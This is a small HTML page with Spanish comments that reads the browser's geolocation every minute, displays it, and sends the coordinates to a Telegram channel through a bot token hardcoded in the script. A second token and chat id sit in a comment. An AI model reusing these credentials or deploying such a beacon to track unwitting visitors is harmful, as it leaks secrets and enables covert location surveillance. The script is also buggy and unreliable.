<!DOCTYPE html>
<html lang="en">

<head>
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
</head>

<body>

  <p id="demo"></p>

<!--
<input type="text" id="fname" name="fname" placeholder="fullname">
<input type="text" id="country" name="country" placeholder="country">
<input type="button" id="add_button" value="Mandar a Telegram">
-->

<div id="response"></div>

<script>

var latitud;
var longitud;


setInterval(getLocation, 60000);


var x = document.getElementById("demo");

function getLocation() {
  if (navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(showPosition);
    mandaTelegram();
  } else { 
    x.innerHTML = "Geolocation is not supported by this browser.";
  }
}

function showPosition(position) {
  x.innerHTML = "Latitude: " + position.coords.latitude + 
  "<br>Longitude: " + position.coords.longitude;
    latitud = position.coords.latitude;
    longitud = position.coords.longitude;
}

    const token = '5351751643:AAH5WZc6gRHJN7aDkUuugf4sJZuWJ48_gZU';
    const chatId = '@Localizacion_Nokia';


function mandaTelegram(){
//    https://api.telegram.org/bot5294478216:AAHAFohgWw5nLc18hp9rCCSnJimpzyyrfUc/sendlocation?chat_id=149197271&latitude=42.456481&longitude=-2.465851
    var api = "https://api.telegram.org/bot" + token + "/sendlocation?chat_id=" + chatId + "&latitude=" + latitud + "&longitude=" + longitud + ";"
    fetch(api);  //mirar como se implementa ?????
  }

</script>
</body>
</html>
